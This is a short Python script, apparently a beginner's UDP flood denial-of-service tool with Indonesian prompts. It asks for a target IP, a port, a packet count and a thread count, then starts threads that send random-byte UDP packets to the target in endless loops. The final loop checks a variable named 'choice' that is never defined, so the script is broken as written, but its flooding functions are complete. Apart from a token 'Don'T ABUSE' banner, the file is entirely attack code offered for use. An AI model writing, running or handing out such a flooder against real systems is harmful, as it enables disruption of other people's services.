import random
import socket
import threading
import os,sys

os.system("clear")
print("Don'T ABUSE")
print("Tools By Pemula")
ip = str(input(" Target IP:"))
port = int(input(" Target Port:"))
times = int(input(" Berapa Paket :"))
threads = int(input(" Berapa Tembakan:"))

os.system("clear")
def run():
    data = random._urandom(1080)
    i = random.choice(("[•]","[•]","[•]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print(i +" Send!!!")
        except:
            print("[X] Send!!!")

def run2():
    data = random._urandom(1025)
    i = random.choice(("[•]","[•]","[•]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +" Send!!!")
        except:
            s.close()
            print("[X] Send!!!")

def run3():
    data = random._urandom(16)
    i = random.choice(("[•]","[•]","[•]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +" Send!!!")
        except:
            s.close()
            print("[X] Send!!!")

def run4():
    data = random._urandom(1024)
    i = random.choice(("[•]","[•]","[•]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +" Send!!!")
        except:
            s.close()
            print("[X] Send!!!")

def run5():
    data = random._urandom(1180)
    i = random.choice(("[•]","[•]","[•]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +" Send!!!")
        except:
            s.close()
            print("[X] Send!!!") 

for y in range(threads):
    if choice == 'y':
        th = threading.Thread(target = run)
        th.start()
        th = threading.Thread(target = run2) 
        th.start()
    else:
        th = threading.Thread(target = run3)
        th.start()
        th = threading.Thread(target = run4)
        th.start()
        th = threading.Thread(target = run5)
        th.start()
